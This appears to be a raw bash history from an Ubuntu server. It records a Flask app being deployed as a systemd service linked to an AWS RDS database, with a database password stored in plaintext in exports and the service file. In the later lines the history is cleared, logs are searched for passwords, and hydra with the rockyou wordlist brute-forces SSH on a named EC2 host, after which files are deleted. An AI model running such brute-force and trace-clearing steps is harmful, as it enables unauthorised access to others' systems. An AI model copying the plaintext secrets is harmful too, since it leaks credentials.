    1  sudo apt-get update -y
    2  sudo apt-get install -y python3-pip python3-dev
    3  pip3
    4  pip
    5  sudo pip3 install flask
    6  vi app.py
    7  sudo vi /etc/init/flask.conf
    8  ls /etc/init.d
    9  find / -name flask.conf
   10  sudo find / -name flask.conf
   11  ls -ltr
   12  service flask start
   13  c
   14  ls /lib/systemd/system/flask.service
   15  ls /lib/systemd/system/
   16  sudo find / -name flas.service
   17  sudo find / -name flask.service
   18  sudo vi /lib/systemd/system/flask.service
   19  sudo service flask statu
   20  sudo service flask status
   21  sudo service flask start
   22  netstat -an | grep 5000
   23  netstat -an | grep LISTEN
   24  cd /var/log
   25  ls -ltr
   26  less syslog
   27  cd /var/logc
   28  cd
   29  ls -ltr
   30  python
   31  python3
   32  python3 app.py
   33  ls -ltr
   34  chmod 755 app.py
   35  sudo service flask start
   36  netstat -an
   37  ls -ltr
   38  ls -ltr /var/log
   39  less /var/log/syslog
   40  which python3
   41  sudo vi /lib/systemd/system/flask.service
   42  sudo service flask start
   43  netstat -an | grep 5000
   44  netstat -an | grep LISTEN
   45  sudo systemctl daemon-reload
   46  sudo service flask start
   47  less /var/log/syslog
   48  netstat -an | grep 5000
   49  sudo service flask stop
   50  vi app.py
   51  sudo service flask start
   52  netstat -an | grep 5000
   53  curl http://0.0.0.0:5000/test
   54  vi app.py
   55  curl http://127.0.0.1:5000/test
   56  curl http://127.0.0.1:5000/test/
   57  ls /etc/systemd/system/
   58  ls -ltr /etc/systemd/system/
   59  ls -ltr /etc/systemd/system/multi-user.target.wants/
   60  sudo vi /lib/systemd/system/flask.service
   61  ls /etc/init.d/
   62  sudo vi /lib/systemd/system/flask.service
   63  vi app.py
   64  echo "Environment=DB_HOST=http://sdfadf.com" >> /lib/systemd/system/flask.service
   65  sudo echo "Environment=DB_HOST=http://sdfadf.com" >> /lib/systemd/system/flask.service
   66  cat /lib/systemd/system/flask.service
   67  sudo echo "Environment=DB_HOST=http://sdfadf.com" >> /lib/systemd/system/flask.service
   68  ls -ltr /lib/systemd/system/flask.service
   69  sudo chmod 644 /lib/systemd/system/flask.service
   70  sudo echo "Environment=DB_HOST=http://sdfadf.com" >> /lib/systemd/system/flask.service
   71  sudo chmod 664 /lib/systemd/system/flask.service
   72  sudo echo "Environment=DB_HOST=http://sdfadf.com" >> /lib/systemd/system/flask.service
   73  sudo chmod 644 /lib/systemd/system/flask.service
   74  ls -ltr /lib/systemd/system/flask.service
   75  sudo 'echo "Environment=DB_HOST=http://sdfadf.com" >> /lib/systemd/system/flask.service'
   76  sudo 'echo "Environment=DB_HOST=http://sdfadf.com" >> /lib/systemd/system/flask.service'cccccc
   77  echo "Environment=DB_HOST=http://sdfadf.com" | sudo tee -a /lib/systemd/system/flask.service
   78  cat /lib/systemd/system/flask.service
   79  sudo reboot
   80  letstat -ancn
   81  netstat -an | grep 5000
   82  cd /var/log
   83  ls -ltr
   84  less syslog
   85  sudo systemctl enable flask
   86  sudo reboot
   87  netstat -an  | grep LISTE
   88  curl http://0.0.0.0:5000/test/
   89  vi /lib/systemd/system/flask.service
   90  sudo vi /lib/systemd/system/flask.service
   91  history | grep tee
   92  vi app.py
   93  ping database-1.cpnotkw5krii.us-east-1.rds.amazonaws.com
   94  telnet
   95  telnet database-1.cpnotkw5krii.us-east-1.rds.amazonaws.com 3306
   96  export DB_USER=admin
   97  export DB_PASSWORD=jerky1999
   98  export DB_HOST=database-1.cpnotkw5krii.us-east-1.rds.amazonaws.com
   99  python3 app.py
  100  vi app.py
  101  python3 app.py
  102  vi app.py
  103  sudo pip3 install mysql
  104  sudo pip3 install mysql_config
  105  python3 app.py
  106  sudo pip3 install mysql-connector
  107  python3 app.py
  108  sudo service flask stop
  109  python3 app.py
  110  vi app.py
  111  python3 app.py
  112  vi app.py
  113  python3 app.py
  114  vi app.py
  115  python3 app.py
  116  vi app.py
  117  python3 app.py
  118  vi app.py
  119  python3 app.py
  120  vi app.py
  121  python3 app.py
  122  env
  123  echo "DB_HOST=database-1.cpnotkw5krii.us-east-1.rds.amazonaws.ccom"
  124  echo "Environment=DB_HOST=database-1.cpnotkw5krii.us-east-1.rds.amazonaws.com" | sudo tee -a /lib/systemd/system/flask.service
  125  echo "Environment=DB_USER=admin" | sudo tee -a /lib/systemd/system/flask.service
  126  echo "Environment=DB_PASSWORD=jerky1999" | sudo tee -a /lib/systemd/system/flask.service
  127  cat /lib/systemd/system/flask.service
  128  reboot
  129  sudo reboot
  130  sudo history -c
  131  history
  132  cd /var/log
  133  ls -ltr
  134  grep PASSWORD *
  135  grep -r PASSWORD *
  136  sudo grep -r PASSWORD *
  137  sudo grep -ri PASSWORD *
  138  cd
  139  ls -ltr
  140  sudo apt-get install hydra
  141  hydra
  142  wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
  143  ls -ltr
  144  vi rockyou.txt
  145  echo "sanfransiscokansascity" >> rockyou.txt
  146  echo "kansascitysanfransisco" >> rockyou.txt
  147  hydra
  148  hydra -l ubuntu -P rockyou.txt -h ssh:ec2-52-203-199-229.compute-1.amazonaws.com
  149  hydra -l ubuntu -P rockyou.txt ssh:ec2-52-203-199-229.compute-1.amazonaws.com
  150  hydra -l ubuntu -P rockyou.txt ssh://ec2-52-203-199-229.compute-1.amazonaws.com
  151  exit
  152  hydra -l ubuntu -P rockyou.txt ssh://ec2-52-203-199-229.compute-1.amazonaws.com
  153  ps -f
  154  ps -ef
  155  top
  156  ps -ef
  157  ls -ltr
  158  df -k
  159  rm -rf app.py
  160  rm -rf hydra.restore